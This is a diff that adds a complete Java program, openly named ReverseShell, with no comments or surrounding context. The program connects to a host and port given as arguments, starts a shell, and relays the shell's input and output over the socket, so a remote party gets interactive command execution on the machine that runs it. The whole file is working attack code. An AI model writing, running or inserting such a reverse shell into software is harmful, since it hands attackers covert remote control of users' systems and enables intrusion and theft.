@@ -1,0 +1,61 @@
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.io.IOException;
+import java.net.Socket;
+
+public class ReverseShell {
+    public static void main(String[] args) {
+        if (args.length != 3) {
+            System.exit(1);
+        }
+
+        String host = args[0];
+        int port = Integer.parseInt(args[1]);
+        String shell = args[2];
+
+        try {
+            Socket socket = new Socket(host, port);
+
+            Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();
+            InputStream processInput = process.getInputStream();
+            OutputStream processOutput = process.getOutputStream();
+
+            InputStream socketInput = socket.getInputStream();
+            OutputStream socketOutput = socket.getOutputStream();
+
+            Thread t1 = new Thread(() -> {
+                try {
+                    byte[] buffer = new byte[1024];
+                    int len;
+                    while ((len = processInput.read(buffer)) != -1) {
+                        socketOutput.write(buffer, 0, len);
+                        socketOutput.flush();
+                    }
+                } catch (IOException ignored) {}
+            });
+
+            Thread t2 = new Thread(() -> {
+                try {
+                    byte[] buffer = new byte[1024];
+                    int len;
+                    while ((len = socketInput.read(buffer)) != -1) {
+                        processOutput.write(buffer, 0, len);
+                        processOutput.flush();
+                    }
+                } catch (IOException ignored) {}
+            });
+
+            t1.start();
+            t2.start();
+
+            t1.join();
+            t2.join();
+
+            process.destroy();
+            socket.close();
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
